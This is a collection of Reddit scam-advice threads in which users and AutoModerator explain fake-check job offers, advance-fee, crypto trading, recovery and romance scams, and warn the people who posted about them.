- Many job offers for remote or work from home jobs are scams. If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.

Some red flags:

- contacted on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview

- the pay is much too high for the job tasks (US $70 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, like "releasing the next level of tasks", before you can get paid

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)
- Do not believe.

Know.

The scam is in the equipment purchase. You get a fake check to deposit and "buy equipment." They send more than you need and they use the clearance delay to screw you. They will ask you to send the "unused" portion back to them.

Then, a week later, your bank tells you the check is bad and you're out all that money.

Run away fast.
- Classic !fakecheck scam. They will have you order the equipment from their 'vendor' (which is just them) and several days later, the money from the check will be taken out of your account as a fraudulent check and you are out the money. Hopefully you didn't give them your SSN or you will be open for identity theft.

There are no entry level, well paying remote jobs...EVER. they are all scams.
- If you got a remote job, there's absolutely no reason why the company would need to trust you with their money to buy equipment. There's no reason they can't just buy it themselves and have it sent to you. If they have a "designated supplier" then they can use that supplier themselves. That "designated supplier" is just the scammer, and you'd be sending them your own money because the check they send you will be fake.
- The so-called "job" does not exist.  The possibility of one, a thought planted into the targeted victim's mind, is simply the means to an end - the end being the scammer's desire to get the victim to send his own money to the scammer after receiving a fake check which will pay for, in this instance, some equipment.

As I have posted here many times before, never be the middleman when it comes to money. That is, receiving money then sending some of it to a third party (which is really the scammer). That screams SCAM!
- Yeah, some sort of !Job scam, OP. If they're sending you funds via check (Digital or paper), it will be fake.
- Career consultant here, part of my job is knowing the basics of how all jobs operate, regardles of industry. I am very aware of IT or CS companies jobs work. None operate like this unless they are scams. Not a single one operates this way, ever! Equipment will always be set up by the company first,  then sent to you loaded with software, security as needed for your exact job requirements. 

You will always have an interview or two (or three...or sometimes four) in a real office or maaaaaaybe Zoom....but that is rare. You often have to come with a very high skillset.

To scammers, you are low hanging ripe fruit, if you are excited to be "given a chance" for a WFH job, if you have no skillset...so making yourself into a higher skillset or not so young/inexperienced looking is key, if that helps any.
- I recruit for a company that does ‚Äúrapid hiring‚Äù. In rapid hiring I do a phone screen (some people utilize a video screen, but it‚Äôs still usually followed by a call of some sort), make a verbal offer, send a Tax credit survey, send the official offer letter, and then the candidate is prompted to complete several tasks like the i9, provide references, verify personal info, etc. Once that is done, HR calls the candidate to set up pre-hire paperwork for background checks/drug testing, which is obviously done on site. Sometimes we send them for fingerprints. Once backgrounds are back, they get an official start date for orientation.

There seem to be several important hiring steps that were missed. Even for a remote position.

My position is remote and, when they hired me, I still had to get a drug test done at a lab. Plus references. I had a valid background screening already, but they still had to check for it. No equipment was sent to me until I actually started orientation. Which is when you provide payroll information . 

If a ‚Äúcompany‚Äù is hiring without a phone call, paperwork, background checks, references, and drug screening‚Ä¶ it‚Äôs probably not real

Drug screens and background checks cost the company money, so a scammer is not going to initiate those things.
- fake check scam.  The "you will receive funds" is the dead giveaway.  Block and ignore.
- This is a really old scam
- Good job at recognizing the red flags of a scam approaching.  Do not interact with this scammer again.
- I guess my first question would be whether or not you're actually a graphic designer. But yeah, the minute they mention sending funds for equipment you know it's a scam. 

Source: am a graphic designer.
- Scam! Thousands have received the same thing don‚Äôt comply
- Yeah it's a scam. They will say they sent you too much money to send it back. And by then the check will bounce and you would be giving your own money back

- They will email you a check, which is not a thing.  Anything they email you is an image of a fake check, a facsimile.  Your banks remote deposit rules state you cannot deposit a facsimile of a check.  Doing so is fraud.  They will close your account and have you flagged as a risk so no other bank will give you an account.
- There are services you can subscribe to that place a fact checker between you and a prospective employer so that all that private information you provide to a stranger entity is qualified before you give it.
- Another reason I hope to never have to put my resume on LinkedIn.  In addition to multiple former coworkers who greatly exaggerated their accomplishments during the times we worked together.
- Yes very common scam here. Just block and move on.
- In addition to what everyone else has said, just remember that you should always know the details of a job *before* the job is offered to you, or before you even apply. No legitimate job will offer the job to you and *then* tell you what your responsibilities are. That‚Äôs not how hiring works. 

I know how much it sucks looking for a job, but a majority of posts on Indeed/linkedin are fake. When applying, make sure that the job listing is very specific about duties and that the interview process is at the very least done on the phone, if not on zoom or in person. Make sure to ask several questions about the position and don‚Äôt let them say ‚Äúwe will get to that later‚Äù or take vague responses as valid answers.
- Here‚Äôs your confirmation, it‚Äôs a scam! No serious company would request that a new employee buys their equipment and then reimburse the expense. If anything they would pre purchase the equipment and simple send it to you. But this is also unheard of.

The "job" needs to be reported to whatever site you found it on as well as any domains they're using (the email, any websites, etc)

- Hi /u/t-poke, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Ok at least I know that I‚Äôm not the only one that seen that it is a fake check scam. I knew that as soon as I read that they wanted the op to send money for the equipment, and I started to say ‚ÄúNo, no, no, don‚Äôt do it!‚Äù
- I have received so many job offered the last two weeks from people like this! It‚Äôs ridiculous the things the scammers do!!
- I feel like the biggest red flag was asking OP to send the front and back of their ID into the email
- > Isn‚Äôt the company supposed to just send me the equipment

> Yes. That is how every single real business operates.

That's the most common but not universally true. I've had multiple jobs where I ordered my laptop/starting equipment myself. In those cases though they either give you a company card/account to use and it will be with a reputable supplier like CDW or you pay yourself and you expense it later in which case you can just go to Amazon or Best Buy or whatever.

They won't ever just send you a check ahead of time and say you have to use it on some shady website nobody has ever heard of though.
- FOMO?
- I think it is misleading to say many remote jobs are scams.

You should just say all remote jobs are scams because the .001% that are legit just cloud the waters. 

The only real legit remote jobs are difficult to land and generally require skills and experience. We‚Äôre all better off just using the shorthand that remote = scam.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- I would be very hesitant to even provide an i9 completed until I was very, very sure the job is legit. That is the real dilemma regarding a remote job; you need to be doing everything really complete to verify that it is a real company. Sending out your personal information just puts you further into the abyss, forget losing any money. It is a real dilemma in my book, wanting a job but never dealing with contacts you haven't verified. 

What a tricky situation the world of working has been placed in. Never overlook all steps of reality as you have pointed out.
- Yes, I am a graphic designer and those have been the roles Ive only applied for. It just is so icky feeling to know there are people out there actually posing as employers. It‚Äôs just yuck
- Hi /u/Any_Guava2032, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Here's another Reddit post that's similar....  chrck scam and everything.
https://www.reddit.com/r/graphic_design/comments/dcq7tq/just_a_reminder_if_you_apply_for_a_design_job_and/
- They said they will send the funds to buy the equipment not the other way round.
- Fear of missing out
- It is, but you did a good job of sniffing it out. Good luck.
- Since there is a real company named Verndale, and there is a posted email + phone number to reach out, did you attempt to reach a live person to verify any of the transaction? Just curious, so many scams don't even have "real companies"  in existence that you could connect with.
- Another red flag would be emails not coming from the company domain

Title: Timbuk2ireland.com legit?
Body: Hi everyone! 

Wondering if you can help me. Anyone know if Timbuk2ireland.com is legit? 

It has no trustpilot reviews and the discounts seem a little too good to be true.

Generally Irish ecommerce gets a .ie domain.

- You already listed 3 red flags in 2 sentences. YES THIS IS A SCAM.
- If in doubt, stay away. No matter if "real" or not.

Registered three weeks ago. And an oh-so-funny name.
- Make your choice: you get counterfeits you could have ordered yourself on Aliexpress for far less, they give you back your money but sell your credit card info, they steal both your money and your credit card info.
- That website was registered just 24 days ago, and it expires in under a year. Those are hallmarks of scam websites
- Thanks for the guidance !

Title: Is the NAS Share Community a Scam Like an MLM or Similar?
Body: I joined a WhatsApp group called NAS Share Community, where they promoted a trading system called AlphaStream 5.0 using the FEEAICC app. The trades were short-term and promised substantial earnings, typically between 40-100%. They offered me a loan to increase my position, which I foolishly accepted. The contract stated that I couldn't use earnings to repay the loan. Instead, I was required to send USD to a C2C exchanger, convert it to USDT, and recharge it to my FEEAICC account. My advice: DO NOT DEPOSIT ANY MONEY INTO THIS!

- Sounds like !crypto trading scam. No real trading, nothing but phony website and lies to steal your money. These scammers love to make you sugn a contract to make you think there's something legal about the whole scheme. The contract is as phony as everything else.

The people in the "community" are part of the scammers group, or bots. No legit investment company uses online groups, or has a Professor and an Assistant, or a Mentor.

**No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to suck more money out of you.
- Why did that just pop up at the top when sorting by NEW if the post is almost five hours old? Something wrong on my end?
- It's worse than an MLM scam. Every crypto/investing social media group exists to get you to a fake site like this that promises you unrealistic returns. They steal what you put in and show you fake numbers on the site so you think you made a profit. Then they charge you more to withdraw money that doesn't exist. Don't get involved with any finance related groups on tg,wa or any other social. 100% are ripoffs. Look up how much legit investments can guarantee. The returns are 4-5% per YEAR max. Stop chasing unrealistic returns and free money or it will happen again.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/.

- > The communication feels strange, and I‚Äôm worried the funds I‚Äôve accumulated might not even be real. With the website unverified and the whole setup feeling off, is this a scam?

Yes, the website and platform are all smoke and mirrors. Nothing about this is real and it's all the scammer contacting you.

Block and ignore this scammer and stop interacting with anything they do. 

> accepting my $5k loss?

Yes, you don't mention how, but I assume you sent it through crypto. It's gone.
- You don't have any earnings. You sent money directly to the scammer's wallet and they changed the numbers on a website to make it look like you were making money.

Cut your losses. People are gonna be in your DMs trying to tell you they can hack and recover your money. They're also scammers.
- How did you find this WhatsApp group? Did you get an unsolicited message from a stranger that befriended you and offered to teach you how to trade crypto?
- Ignore the loan, there never was any money.
- Of course that's a scam.
- Scam all the way, from the beginning. No legit company forces you to pay a "fee" or "taxes" or repay a (fake) loan to withdraw money. That's just a scam to suck more money out of you.

Whatever money you gave them is gone, you will never get it back. **You did not invest, you gave your money to scammers.** The money that they claim you earned is a lie, just numbers on a screen to make you think you earned a profit.

- If this is legitimate, they'll have a policy or claim number available to share. Then look up the company's main phone number and call them to ask them about it.

Sorry for your loss.
- Use this information to find policies (in US):
https://content.naic.org/article/learn-how-use-naic-life-insurance-policy-locator
- This sounds like a sales attempt more than anything.
- I would expect important business like this to be conducted by mail or possibly a phone call.   A text feels super scammy.   The fact that they outright state you may have no knowledge of the policy is a red flag. Proceed with extreme caution.
- Global life is a very scammy company and I would not be surprised if they are just trying to sell you life insurance.
- Also if you are the beneficiary of a life insurance policy then you should not have to put out any money. It‚Äôs their job to distribute the money. You should never pay a dime.
- Run, it's Globe Life! Lying MLM!
- Pulling names from obituaries is a new low for even the most predatory MLM huns.
- Nice, I didn't know this was a thing
- I think you‚Äôre right. I gave in and responded and it definitely seems like it. She said my mom has a $2000 AD&D policy and she wants to walk me through (why?) and ‚Äúyou mom also got you access to the same benefits she has‚Äù ahhhh ok then..
- Absolutely. And they will say *anything*.
- Pretty sure that‚Äôs what this is once I responded (curiosity got the best of me lol)
- While I have heard they might have a legitimate product, AIL is an mlm business model and I would recommend being weary of them.

- !whois valurelv.com
- Hey there,

Running over the website and business generally there are a few things that are suss. The products seem real but I‚Äôm doubtful of whether this is actually a legit business. 

1.) Social media following and reviews on IG appear to be generated by bot accounts (little to no posts identified on accounts or uploaded stories are inconsistent with their profile)

2.) Little to no actual foot print of the business online before the domain registration. Including on the contact details (gmail address) supplied on the website. 

3.) Potential owner/ operator of the business identified and seems to have indicators of unexplained wealth‚Ä¶ IMHO potentially the business is a front for something else‚Ä¶

4.) Third party scam analysis tools assess the website as risky and reviews indicate customers not receiving their products.

Hope that helps!
- ` WHOIS REPORT FOR VALURELV.COM `

This domain name was first registered only 7 months ago (Jun 2024) and it was only registered for a single year (Expires: Jun 2025). 

It is also concerning that they are hiding their contact info on Whois. This website is hosted on a server located in Canada (*Cloudflare, Inc.*), but this is probably a "proxy" which is masking where the website's server actually is.

Title: Elitecapitalhub.oneline scam or real
Body: So last week I joined a Facebook group for Women Owned Businesses. The purpose of the group was supposed to be to talk about how to help grow your business. I own a very small business, and right now things are very slow. I am not surprised, it is January, right after Christmas, people aren‚Äôt spending, but anyway I needed to look at some new ideas. So I joined the group. Very quickly I started getting messages for work from home jobs. Whoa those sounded great! Send emails get paid! Yep got scammed $100 on that one‚Ä¶.. next one was optimize our apps, get paid salary plus commissio! This one was much tricker because I was actually MAKING MONEY and was able to successfully pull money back out into my cash app until yesterday when they told me I had to deposit an additional $1525 to get my original $500 back out. I almost did it too! Until I got on here this morning! Goodbye to that $500! Now I have one last $100 in this Elitecapitalhub and they are saying I need to purchase a trading license to withdraw my money.

  
Yes with ALL I have been through this week, I know better. I am not a wealthy person‚Ä¶ this was literally all the money I had, and I have to pay people back money I borrowed now for yesterda‚Äôs stupid mistake. These people are GOOD! I am highly educated. I researched and researche, checked ip addresses and it all checked out. And the emotions they were able to play and feed on were just unbelievable!

Anyway before I lose one penny more‚Ä¶.I just wanted to see if anyone has experience with this Elitecapitalhub or ever being told they need to buy a trading license. I am pretty sure it‚Äôs not real either‚Ä¶

NEVER PAY TO GET PAID

Any investor site you are sent to from social media is going to be a scam. 

These are fake fees are intended to milk a few more dollars from you before you give up.
- I am yet to see a SINGLE "dot online" that wasn't a scam. 

All clever TLDs should be treated as scams prima facie: https://www.reddit.com/r/Scams/comments/1h5otz4/krebs_why_phishers_love_new_tlds_like_shop_top/
- It is a scam, it's all lies to take your money. If you pay for the (fake) trading license, they will say you need to pay taxes, and transfer fees, and late charges, on and on. **You will never ever get your money back.** I don't have to look at their website to know this, because many other people have been scammed the same way. 

I am sorry you lost money. Now, you need to educate yourself more about scams. Straight talk here:  Whatever you did as research was not enough or not the right kind of research, because all of these scams are common, and reported every day. **Most work from home jobs are scams, they will take all your money and disappear.**

**This is not a job, its a scam to take your money.** The website is fake, the tasks are fake, the people are all lying to you. The name of the "company" doesn't really matter, because there are hundreds of these phony jobs using different company names. But the scams all follow the same pattern:  You will be required to pay a fee to continue working or withdraw. Then another fee, and another.

There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money. 

Read through r/scams, search for job scams and task scams, to see how people fall victim to these scams and lose money. Some people lose thousands, they lose their car and home and life savings.
- These are all obvious scams.

What "research" did you do? How exactly did you check the IP addresses?
- I'm not sure "I am highly educated. I researched and researche, checked ip addresses and it all checked out" follows from your getting scammed three times in a week. It sounds like you know just enough to convince yourself you're safe when you're very clearly not.

"checking ip addresses" is meaningless. If you can't spot that a .online domain is a likely fake, if you can't use whois to figure out that a domain is new, you aren't educated well enough to decide what's legit online.

You're about to be defrauded once again by an !advancefee scammer. Stop looking for work from home jobs through facebook. It's going to be a scam every single time.
- I see this comment on every post and feel it is very important for this one. DO NOT interact with anyone claiming they can help you in your private messages!
- Hi /u/Mother_Was_A_Hamster, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Hi /u/TheMoreBeer, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.

Title: My father has been scammed and manipulated for half a year?!
Body: I am not 100% how it went down, I going to ask my dad more details, however its unlikely he'll tell me. It might be vague for now, sorry.

Background info: My dad's quite gullible, but I think all this happened because he's very desperate. He wants to support his family financially and he's failed in doing so. time's ticking for him and he's very desperate to find a way to make money quick for us.

Anyways, so 7 months ago, he was talking to these people on WhatsApp, and he had to fly out to Dubai for "business". During the first month, two random guys approached him on the street and began talking about some gold business. They took him out to dinner, was very nice to him, befriended him, and pitched the idea of "BIG POTENTIAL, BIG MONEY,  GOLD BUSINESS". Anyways, dad told us he would extend his stay because he thinks he can make a lot of money with these guys. My family knew it was a scam, we told him over and over, but he's stubborn and desperate. They promised him he would make lots of money if he did some things. Throughout the months, he contacted me, my mom, and other family members for several thousands of dollars. He never explained why, but I'm assuming it's what the scammers told him. He made us send the money to these people's emails and him. Throughout these months, he also had to fly out to other countries like India, and Australia, to "collect gold" for these people. 7 months later, he came back home. With nothing but DEEPSHIT.

During the rare Facetime calls we had. He looked so tired, and sometimes I heard sketchy people talking in the back. It's just overall depressing, 7 months wasted, manipulated to work for these scammers. 

Hes back home and I still see him talking to sketchy people on whatsapp. Always about some business thing. And asked me to borrow money again.

If I find out more info Ill write it down. Not sure what I want from this post... What kind of scam is this? what do I do. He has to face the true facts but, he's too stubborn.

- Hopefully he‚Äôs not transporting anything illegal between these countries. 
He might not come home next time.
- So you guys knew it was a scam from the very beginning but you helped him and even gave your own money?
- he's probably getting into a !crypto scam on whatsapp. he needs to not be given money and y'all need to keep your finances secure. his money and the money you willingly handed over aswell is gone.
- If you guys knew it was a scam, why did you keep helping him? Someone needed to step in and say no because all you and your family did was facilitate the scam. It's very strange that he met ppl on whatsapp, then flew out, but then met two other RANDOM people not connected to the calls and started working with them. It sounds like what he's doing is illegal, flying back and forth with gold? If you want to help your dad, don't give him anymore money. They will leave him alone once they realize the well is dry.
- It's possible he really was picking up shipments of gold, however the gold he picked up was gold that other victims had been scammed into buying and packaging up... And the Scammers used your dad as a shipment pickup mule.
- They scammed all of you...


Take him out of this as soon as possible, the only thing that can't be recovered is the money you spent, but take him out before something bad happens. No more money, no more cellphones if you can. Now he's a money cow, but if they understand they have him under control they could use him for sketchy activities, and he could be in trouble (not just economic trouble).


The scam cam be anyone where you do "tasks" and get a little reward and then you give them money to get even better rewards, but never as much as you paid, there is a ton of them. Get him out
- Hi /u/great_molassesflood, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

If the scammer used Bitcoin, then you can report the scammer‚Äôs Bitcoin wallet address here: https://www.bitcoinabuse.com/reports. If the scammer used Ethereum, then you can report the scammer‚Äôs Ethereum wallet address here: https://info.etherscan.com/report-address/. You can see how much cryptocurrency has been sent to the scammer‚Äôs wallet address here: https://www.blockchain.com/explorer. Thanks to redditor nimble2 for this script.

- I'm not so sure about my other family members. They most likely didn't give him a dime. But why I gave him money was because I felt obligated. Now, whenever he asks, I tell him I have nothing. But before, I felt like I had to cuz I'm his son, I'm not even an adult and it feels wrong to ignore/say no. And he sounded desperate, saying "Money will come soon, don't worry about it.". Yeah, its stupid. Not gonna happen again cuz I told him he emptied my pockets. I think I was his last option after all the other family members stopped and ignored his request for money. 

I don't know what the scammer's goal is, whether to take all his savings/money. Or make him work for "free". Such as the flying around. Not so sure exactly what he had to do, will find out. Because 7 months of doing what exactly? That's a long ass time...
- Good! I recently dealt with a scammer issue which lead me to this sub. And we were all telling my uncle no and he thought we were being mean. Even know the scammer texts him to say they lost money too but they have a sure thing. He refuses to block them.

Title: Partners brother in a scam. Trying to tread lightly and provide concrete information who he‚Äôs talking to is not real
Body: My boyfriend‚Äôs brother has met someone online that we all know is not real. I tried to reverse image search this person and it comes up (though limited) as coco koma? Anyway, it‚Äôs a blonde girl with a T-shirt and no pants on and I want to find the source of the photo as *some* proof and then find subsequent examples of scams that use this photo. 

He has mental health issues and gets temperamental accusing family of not wanting him to be happy. There has been a send money request that has been stopped but the big picture is that he doesn‚Äôt understand family is looking out for him and is in denial this girl isn‚Äôt real. 

We would love to find articles or evidence for him that this is happening to lots of other people rather than saying ‚Äúhey, you gotta stop this.‚Äù

- Spend some time reading recent posts on this sub and you'll find many of these. 

The claim that "you just don't want me to be happy" is apparently a common response. It's a sort of defense response from someone who doesn't want to admit they've been fooled and doesn't want to give up the dream. It's hard to see why anyone would actively want a family member to be unhappy, but you're not really dealing with logic or rational thought here. The anger directed at you and your family is deflected from its real targets: the scammer and himself.

Be firm and be patient. Continue to protect his finances if you can. To get him out of the denial may require help from a mental health professional, if he's got someone.
- !romance

!pig
- You already have evidence this is a scam, it seems like the solution lies with his mental health issues and feelings towards his family, rather than a problem he‚Äôs become vulnerable to because of those things.

Some people are willing to fall for a romance scam if they get the affection they desire. They‚Äôre happy to pay for the emotional fulfilment.
- Do you have the picture? I can try to find the source. Though sometimes the photos aren't stolen, they're AI.
- Can you get him to a place with others his age with a similar disorder? This in person social experience could prove to be a true connection and  the positive experience he needs .
- The scammers often have scripts that play on this. They will subtly hint that if anyone tries to block their "relationship" then they are jealous or doesn't want them to be happy. 

All of this lingo is adopted by the victim and sort of reinforced eg "she did say you guys will try your best to block our love!"

Quite sad really
- Thanks! It‚Äôs tough because we all understand but sharing with him‚Ä¶. he gets really upset. I‚Äôll double check the health professional he had that got him into a stable place with his medication is someone who can help, or be contacted for help, with this.
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Pig butchering scam.

It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Romance scam.

